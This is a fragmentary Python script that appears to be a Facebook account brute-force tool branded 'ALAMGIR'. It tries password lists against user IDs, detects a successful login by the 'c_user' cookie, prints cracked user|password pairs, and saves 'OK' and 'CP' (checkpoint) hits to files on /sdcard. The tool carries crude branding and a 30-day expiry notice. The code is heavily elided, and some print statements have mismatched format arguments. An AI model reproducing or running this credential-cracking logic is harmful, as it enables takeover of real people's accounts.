...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/ALAMGIR-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/ALAMGIR-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1m [!] Tool    : ALAMGIR TERA Papa ")

			print (" [!] Brand   : FUCK BOY ALAMGIR")

			print(" [!] Expired Date Olny 30 Day")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[ALAMGIR]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALAMGIR_OK🤫] {user} | {pw}")
                    ...
                    try:
                        ...
                        open('/sdcard/ALAMGIR_CP.txt' , 'a').write('%s\n' % wrt)
